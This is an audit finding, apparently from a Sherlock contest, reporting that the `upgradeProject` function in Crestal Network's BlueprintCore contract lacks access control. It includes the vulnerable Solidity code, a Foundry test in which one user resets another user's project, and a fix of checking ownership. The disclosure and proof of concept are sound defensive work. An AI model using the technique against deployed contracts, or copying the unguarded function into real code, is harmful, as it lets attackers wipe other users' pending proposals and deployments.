# Everyone can call the `BlueprintCore::upgradeProject` function

# Summary

The [`upgradeProject`](https://github.com/sherlock-audit/2025-03-crestal-network/blob/27a3c28155702b3a68f29347efedffb048010e33/crestal-omni-contracts/src/BlueprintCore.sol#L198) function lacks access control and everyone can call it and reset the info for a given project.

# Root Cause

The `BlueprintCore::upgradeProject` function allows the caller to reset the info for a given project:

```solidity

    function upgradeProject(bytes32 projectId) public hasProject(projectId) {
        // reset project info
        projects[projectId].requestProposalID = 0;
        projects[projectId].requestDeploymentID = 0;
        projects[projectId].proposedSolverAddr = dummyAddress;
    }

```

The problem is that the function is public and everyone can call it. This means a malicious user can call the `getLatestUserProjectID` for a given address, retrieve the `projectID` and then the malicious user can call the `upgradeProject` with argument this `projectId`. After calling `upgradeProject`, any subsequent proposal or deployment request for the project would need to go through the entire process again. The project will essentially become "fresh" for future proposal/deployment requests. 

# Impact

If a malicious user calls the `upgradeProject` function for a particular `projectId` owned by another user any existing proposal or deployment associated with the project will be cleared because their IDs are reset to 0. This means that the system will forget about any ongoing proposal or deployment for that project and treat it as if no proposal or deployment request had ever been made for the project.

# PoC

The following function shows how the user1 creates an agent and the user2 upgrades the project of user1:

```solidity

    function testUpgradeProject() public {
        string memory base64Proposal = "test base64 proposal";
        string memory serverURL = "http://eee.com";
        
        vm.startPrank(owner);
        blueprint.addPaymentAddress(address(erc20));
        blueprint.setNFTContractAddress(address(erc721));
        vm.stopPrank();

        vm.startPrank(user1);
        
        erc721.mint(user1, 0);

        bytes32 projectId = keccak256(abi.encodePacked(block.timestamp, msg.sender, block.chainid));
        
        blueprint.createAgentWithNFT(projectId, base64Proposal, address(0x00), serverURL, 0);
        vm.stopPrank();
        
        blueprint.getProjectInfo(projectId);
        
        //malicious user
        vm.startPrank(user2);
        bytes32 projectIdUser1 = blueprint.getLatestUserProjectID(user1);
        blueprint.upgradeProject(projectIdUser1);
        vm.stopPrank();

        blueprint.getProjectInfo(projectId);
    }

```

# Mitigation

Add a check to ensure that the caller of the `upgradeProject` function is the owner of the project.
